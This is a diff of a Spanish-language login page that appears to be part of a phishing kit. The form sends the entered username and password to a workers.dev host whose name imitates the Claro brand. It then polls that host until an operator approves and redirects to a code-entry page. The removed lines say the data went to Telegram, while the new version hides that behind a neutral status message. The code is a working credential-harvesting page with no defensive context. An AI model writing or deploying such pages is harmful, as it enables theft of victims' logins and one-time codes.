@@ -1,62 +1,58 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <title>Login</title>
+<meta charset="UTF-8">
+<title>Login</title>
 </head>
 <body>
-  <h2>Formulario de Acceso</h2>
-  <form id="loginForm">
-    <label>Usuario:</label>
-    <input type="text" id="usuario" required><br><br>
+<h2>Formulario de Acceso</h2>
+<form id="loginForm">
+  <label>Usuario:</label>
+  <input type="text" id="usuario" required><br><br>
+  <label>Clave:</label>
+  <input type="password" id="clave" required><br><br>
+  <button type="submit">Enviar</button>
+</form>
 
-    <label>Clave:</label>
-    <input type="password" id="clave" required><br><br>
+<h2>Ingresando...</h2>
+<p id="status">Esperando autorización...</p>
 
-    <button type="submit">Enviar</button>
-  </form>
+<script>
+let loginId;
 
-  <h2>Ingresando...</h2>
-  <p id="status">Esperando autorización...</p>
+document.getElementById("loginForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const usuario = document.getElementById("usuario").value;
+  const clave = document.getElementById("clave").value;
 
-  <script>
-    let userId = null;
+  const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ usuario, clave })
+  });
 
-    document.getElementById("loginForm").addEventListener("submit", async (e) => {
-      e.preventDefault();
-      const usuario = document.getElementById("usuario").value;
-      const clave = document.getElementById("clave").value;
+  const data = await res.json();
+  if (data.ok) {
+    loginId = data.id;
+    document.getElementById("status").textContent = "Esperando autorización...";
+    startPolling();
+  } else {
+    alert("Error: " + data.error);
+  }
+});
 
-      const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ usuario, clave })
-      });
+// Polling para revisar autorización
+function startPolling() {
+  const interval = setInterval(async () => {
+    const statusRes = await fetch(`https://blue-night-7897.claropromoxlaro.workers.dev/status?id=${loginId}`);
+    const statusData = await statusRes.json();
 
-      const data = await res.json();
-      if(data.ok){
-        userId = data.id;
-        document.getElementById("status").textContent = "✅ Datos enviados a Telegram, esperando autorización...";
-        startPolling();
-      } else {
-        alert("❌ Error: " + data.error);
-      }
-    });
-
-    function startPolling() {
-      const statusEl = document.getElementById("status");
-      const interval = setInterval(async () => {
-        if(!userId) return;
-        const res = await fetch(`https://blue-night-7897.claropromoxlaro.workers.dev/status?id=${userId}`);
-        const data = await res.json();
-        if(data.autorizado){
-          clearInterval(interval);
-          window.location.href = "codigo.html";
-        } else {
-          statusEl.textContent = "⌛ Esperando autorización...";
-        }
-      }, 3000);
+    if (statusData.autorizado) {
+      clearInterval(interval);
+      window.location.href = "codigo.html";
     }
-  </script>
+  }, 3000);
+}
+</script>
 </body>
 </html>
